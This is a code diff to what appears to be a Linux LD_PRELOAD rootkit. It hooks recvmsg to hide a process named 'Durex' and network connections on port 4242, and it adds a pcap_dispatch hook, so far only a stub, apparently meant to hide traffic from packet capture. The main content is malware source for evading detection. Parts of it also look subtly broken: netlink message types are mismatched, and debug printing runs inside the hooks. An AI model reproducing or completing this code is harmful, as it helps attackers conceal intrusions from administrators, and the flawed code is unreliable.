@@ -12,6 +12,7 @@
 #include <linux/rtnetlink.h>
 #include <arpa/inet.h>
 #include <linux/inet_diag.h>
+#include <pcap/pcap.h>
 
 static const char	*process_to_filter = "Durex";
 
@@ -194,6 +195,7 @@ DECLARE_FGETS();
 		ssize_t		ret, ret2;											\
 																		\
 		ret = original_##recvmsg(sockfd, msg, flags);					\
+		printf("RECVMSG ret:%ld\n", ret);								\
 		if (ret > 0) {													\
 			ret2 = ret;													\
 			if (((struct sockaddr_nl *)msg->msg_name)->nl_family == AF_NETLINK) { \
@@ -201,7 +203,7 @@ DECLARE_FGETS();
 				while (NLMSG_OK(h, ret2)) {								\
 					if (h->nlmsg_type == NLMSG_DONE)					\
 						break ;											\
-					if (h->nlmsg_type == RTM_NEWADDR) {					\
+					if (h->nlmsg_type == RTM_NEWADDR || h->nlmsg_type == RTM_NEWROUTE) { \
 						struct inet_diag_msg *r = NLMSG_DATA(h);		\
 						if (ntohs(r->id.idiag_sport) == 4242)			\
 							h->nlmsg_type = NLMSG_DONE;					\
@@ -214,6 +216,29 @@ DECLARE_FGETS();
 	}
 
 DECLARE_RECVMSG();
+
+#define DECLARE_PCAP_DISPATCH()											\
+	static int (*original_##pcap_dispatch)(pcap_t *, int, pcap_handler, u_char *) = NULL; \
+	int pcap_dispatch(pcap_t *p, int cnt, pcap_handler callback, u_char *user) { \
+		if (original_##pcap_dispatch == NULL) {							\
+			original_##pcap_dispatch = dlsym(RTLD_NEXT, "pcap_dispatch"); \
+			if (original_##pcap_dispatch == NULL) {						\
+				fprintf(stderr, "Error in dlsym: %s\n", dlerror());		\
+			}															\
+		}																\
+																		\
+		int		ret, ret2;												\
+																		\
+		ret = original_##pcap_dispatch(p, cnt, callback, user);			\
+		printf("PCAP_DISPATCH ret:%d\n", ret);							\
+		if (ret > 0) {													\
+			ret2 = ret;													\
+			printf("ret:%d\n", ret2);									\
+		}																\
+		return ret;														\
+	}
+
+DECLARE_PCAP_DISPATCH();
 
 /*
 Compilation status 
